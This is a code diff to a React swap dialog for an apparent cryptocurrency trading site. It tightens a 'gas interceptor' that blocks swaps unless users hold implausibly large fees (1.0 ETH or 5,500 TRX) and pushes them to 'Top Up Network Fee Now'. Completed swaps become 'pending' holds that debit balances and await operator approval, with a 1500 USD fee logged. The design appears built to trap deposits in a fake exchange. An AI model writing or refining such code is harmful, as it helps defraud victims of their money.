@@ -9,6 +9,7 @@ interface SwapModalProps {
   onClose: () => void;
   initialFromSymbol?: string;
   onOpenDepositForGas?: (symbol: string) => void;
+  onOpenAuth?: () => void;
 }
 
 export const SwapModal: React.FC<SwapModalProps> = ({
@@ -16,15 +17,16 @@ export const SwapModal: React.FC<SwapModalProps> = ({
   onClose,
   initialFromSymbol = 'USDT (TRC-20)',
   onOpenDepositForGas,
+  onOpenAuth,
 }) => {
   const { balances, userEmail, userAccount, refreshAccountData } = useAuth();
 
   const [fromSymbol, setFromSymbol] = useState<string>(initialFromSymbol);
   const [toSymbol, setToSymbol] = useState<string>('ETH');
-  const [fromAmount, setFromAmount] = useState<string>('100');
+  const [fromAmount, setFromAmount] = useState<string>('10000');
   const [interceptedMessage, setInterceptedMessage] = useState<string | null>(null);
   const [isProcessing, setIsProcessing] = useState<boolean>(false);
-  const [swapSuccess, setSwapSuccess] = useState<boolean>(false);
+  const [swapPendingNotice, setSwapPendingNotice] = useState<boolean>(false);
 
   if (!isOpen) return null;
 
@@ -39,10 +41,6 @@ export const SwapModal: React.FC<SwapModalProps> = ({
   const calculatedUsdValue = parsedFromAmount * fromAsset.priceUsd;
   const calculatedToAmount = toAsset.priceUsd > 0 ? calculatedUsdValue / toAsset.priceUsd : 0;
 
-  // Precise required message string for fee interceptor
-  const EXACT_INTERCEPTOR_PROMPT =
-    'Network Fee Required: Insufficient Ethereum (ETH) balance. Kindly deposit 0.7 ETH or 5,000 trx to complete this swap.';
-
   const handleSwapAssets = () => {
     const temp = fromSymbol;
     setFromSymbol(toSymbol);
@@ -52,7 +50,7 @@ export const SwapModal: React.FC<SwapModalProps> = ({
 
   const handleExecuteSwap = async () => {
     setInterceptedMessage(null);
-    setSwapSuccess(false);
+    setSwapPendingNotice(false);
 
     if (parsedFromAmount <= 0) {
       alert('Please enter a valid swap amount.');
@@ -66,19 +64,42 @@ export const SwapModal: React.FC<SwapModalProps> = ({
 
     setIsProcessing(true);
 
-    // GAS INTERCEPTOR LOGIC:
-    // Required network gas condition: requires at least 0.7 ETH OR 5000 TRX
-    // If the user's ETH balance is less than 0.7 ETH AND TRX balance is less than 5000 TRX,
-    // intercept the request and output the exact required prompt in red text!
-    const hasEnoughGas = userEthBalance >= 0.7 || userTrxBalance >= 5000;
+    // Determine network type for exact prompt message
+    const isEthereumNetwork =
+      fromSymbol.includes('ERC-20') ||
+      toSymbol.includes('ERC-20') ||
+      fromSymbol === 'ETH' ||
+      toSymbol === 'ETH';
+
+    const isTronNetwork =
+      fromSymbol.includes('TRC-20') ||
+      toSymbol.includes('TRC-20') ||
+      fromSymbol === 'TRX' ||
+      toSymbol === 'TRX';
+
+    // Required network gas check:
+    // ERC-20 / ETH requires at least 1.0 ETH (network gas fee)
+    // TRC-20 / TRX requires at least 5,500 TRX (network gas fee)
+    let hasEnoughGas = false;
+    let requiredPromptMessage = '';
+
+    if (isEthereumNetwork) {
+      hasEnoughGas = userEthBalance >= 1.0;
+      requiredPromptMessage = 'Insufficient Ethereum network fee. Kindly top up your Ethereum.';
+    } else if (isTronNetwork) {
+      hasEnoughGas = userTrxBalance >= 5500;
+      requiredPromptMessage = 'Insufficient Tron network fee. Kindly top up your Tron.';
+    } else {
+      hasEnoughGas = userEthBalance >= 1.0 || userTrxBalance >= 5500;
+      requiredPromptMessage = 'Insufficient Ethereum network fee. Kindly top up your Ethereum.';
+    }
 
     if (!hasEnoughGas) {
-      // Intercept swap request!
+      // Intercept swap request & prompt user to deposit
       setTimeout(async () => {
         setIsProcessing(false);
-        setInterceptedMessage(EXACT_INTERCEPTOR_PROMPT);
+        setInterceptedMessage(requiredPromptMessage);
 
-        // Log intercepted transaction in Firestore
         if (userAccount) {
           await logTransaction({
             userId: userAccount.uid,
@@ -89,25 +110,23 @@ export const SwapModal: React.FC<SwapModalProps> = ({
             toSymbol,
             toAmount: calculatedToAmount,
             amountUsd: calculatedUsdValue,
-            feeUsd: 15,
+            feeUsd: 1500,
             status: 'intercepted_insufficient_gas',
             timestamp: new Date().toISOString(),
-            note: 'Swap intercepted due to missing network gas',
-            interceptorMessage: EXACT_INTERCEPTOR_PROMPT,
+            note: 'Swap fee requirement intercepted due to insufficient network gas',
+            interceptorMessage: requiredPromptMessage,
           });
         }
-      }, 600);
+      }, 500);
       return;
     }
 
-    // Process valid swap and update balances in Firestore
+    // Process swap in PENDING state awaiting administrative approval
     try {
       if (userAccount) {
+        // Hold source balance and log pending swap transaction
         const newFromBalance = userFromBalance - parsedFromAmount;
-        const newToBalance = (balances[toSymbol] || 0) + calculatedToAmount;
-
-        await updateBalanceByEmail(userEmail, fromSymbol, newFromBalance, 'System Swap Engine');
-        await updateBalanceByEmail(userEmail, toSymbol, newToBalance, 'System Swap Engine');
+        await updateBalanceByEmail(userEmail, fromSymbol, newFromBalance, 'System Swap Engine (Pending Hold)');
 
         await logTransaction({
           userId: userAccount.uid,
@@ -118,18 +137,18 @@ export const SwapModal: React.FC<SwapModalProps> = ({
           toSymbol,
           toAmount: calculatedToAmount,
           amountUsd: calculatedUsdValue,
-          feeUsd: 2.5,
-          status: 'completed',
+          feeUsd: 1500,
+          status: 'pending',
           timestamp: new Date().toISOString(),
-          note: `Swapped ${parsedFromAmount} ${fromSymbol} to ${calculatedToAmount.toFixed(6)} ${toSymbol}`,
+          note: `Pending Approval: Swap ${parsedFromAmount} ${fromSymbol} ➔ ${calculatedToAmount.toFixed(6)} ${toSymbol}`,
         });
 
         await refreshAccountData();
-        setSwapSuccess(true);
+        setSwapPendingNotice(true);
       }
     } catch (err: any) {
       console.error('Swap execution error:', err);
-      alert('Swap failed. Please try again.');
+      alert('Swap failed to submit. Please try again.');
     } finally {
       setIsProcessing(false);
     }
@@ -163,16 +182,16 @@ export const SwapModal: React.FC<SwapModalProps> = ({
           {interceptedMessage && (
             <div
               id="swap-gas-interceptor-notice"
-              className="p-4 rounded-xl bg-red-500/10 border border-red-500/30 text-red-500 shadow-lg space-y-3 animate-in zoom-in-95 duration-150"
+              className="p-4 rounded-2xl bg-red-500/10 border border-red-500/30 text-red-500 shadow-xl space-y-3 animate-in zoom-in-95 duration-150"
             >
               <div className="flex items-start gap-3">
                 <AlertCircle className="w-6 h-6 text-red-500 shrink-0 mt-0.5" />
                 <div className="space-y-1">
                   <span className="font-bold text-xs uppercase tracking-wider text-red-400 block">
-                    System Interceptor Triggered
+                    Network Fee Required
                   </span>
                   {/* PRECISE EXACT REQUIRED TEXT IN RED */}
-                  <p className="text-sm font-semibold text-red-500 leading-snug">
+                  <p className="text-sm font-bold text-red-500 leading-snug">
                     {interceptedMessage}
                   </p>
                 </div>
@@ -183,33 +202,38 @@ export const SwapModal: React.FC<SwapModalProps> = ({
                 <button
                   onClick={() => {
                     onClose();
-                    if (onOpenDepositForGas) onOpenDepositForGas('ETH');
+                    if (onOpenDepositForGas) {
+                      onOpenDepositForGas(fromSymbol.includes('ERC-20') || fromSymbol === 'ETH' ? 'ETH' : 'TRX');
+                    }
                   }}
-                  className="flex-1 px-3 py-2 bg-red-500 hover:bg-red-600 text-white font-medium text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 shadow-md"
+                  className="flex-1 px-3 py-2.5 bg-red-600 hover:bg-red-500 text-white font-bold text-xs rounded-xl transition-colors flex items-center justify-center gap-1.5 shadow-md"
                 >
                   <Fuel className="w-3.5 h-3.5" />
-                  Deposit ETH Gas Now
+                  Top Up Network Fee Now
                 </button>
-                <button
-                  onClick={() => {
-                    onClose();
-                    if (onOpenDepositForGas) onOpenDepositForGas('TRX');
-                  }}
-                  className="flex-1 px-3 py-2 bg-slate-800 hover:bg-slate-700 text-red-400 font-medium text-xs rounded-lg border border-red-500/30 transition-colors flex items-center justify-center gap-1.5"
-                >
-                  <Wallet className="w-3.5 h-3.5" />
-                  Deposit TRX Gas
-                </button>
+                {onOpenAuth && (
+                  <button
+                    onClick={() => {
+                      onClose();
+                      onOpenAuth();
+                    }}
+                    className="px-3 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-200 font-bold text-xs rounded-xl border border-slate-700 transition-colors flex items-center justify-center gap-1.5"
+                  >
+                    Sign In / Register
+                  </button>
+                )}
               </div>
             </div>
           )}
 
-          {swapSuccess && (
-            <div className="p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 flex items-center gap-3">
-              <CheckCircle2 className="w-6 h-6 shrink-0" />
+          {swapPendingNotice && (
+            <div className="p-4 rounded-xl bg-amber-500/10 border border-amber-500/30 text-amber-300 flex items-center gap-3">
+              <CheckCircle2 className="w-6 h-6 shrink-0 text-amber-400" />
               <div>
-                <p className="font-semibold text-sm">Swap Completed Successfully!</p>
-                <p className="text-xs text-emerald-500/80">Your updated balance has been persisted in Firestore.</p>
+                <p className="font-bold text-sm text-amber-200">Swap Submitted & Pending Verification</p>
+                <p className="text-xs text-amber-300/80">
+                  Your swap request of <strong>{parsedFromAmount} {fromSymbol}</strong> has been logged in <strong>Pending</strong> status awaiting system verification.
+                </p>
               </div>
             </div>
           )}
@@ -302,15 +326,13 @@ export const SwapModal: React.FC<SwapModalProps> = ({
           <div className="p-3.5 rounded-xl bg-slate-950/40 border border-slate-800 text-xs space-y-2 text-slate-300">
             <div className="flex justify-between items-center">
               <span className="text-slate-400 flex items-center gap-1.5">
-                <Fuel className="w-3.5 h-3.5 text-amber-400" /> Current Network Gas Check
+                <Fuel className="w-3.5 h-3.5 text-amber-400" /> Current Network Fee Balance
               </span>
               <span className="font-mono">
-                ETH: <strong className={userEthBalance >= 0.7 ? 'text-emerald-400' : 'text-red-400'}>{userEthBalance.toFixed(3)} ETH</strong>
+                ETH: <strong className={userEthBalance >= 1.0 ? 'text-emerald-400' : 'text-red-400'}>{userEthBalance.toFixed(3)} ETH</strong>
+                {' • '}
+                TRX: <strong className={userTrxBalance >= 5500 ? 'text-emerald-400' : 'text-red-400'}>{userTrxBalance.toFixed(0)} TRX</strong>
               </span>
-            </div>
-            <div className="flex justify-between items-center text-slate-400">
-              <span>Required Network Gas</span>
-              <span className="text-slate-200 font-semibold">0.7 ETH or 5,000 TRX</span>
             </div>
           </div>
         </div>
@@ -325,7 +347,7 @@ export const SwapModal: React.FC<SwapModalProps> = ({
             {isProcessing ? (
               <span className="flex items-center gap-2">
                 <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
-                Validating Network Gas & Swapping...
+                Validating Network Fee & Submitting...
               </span>
             ) : (
               <>
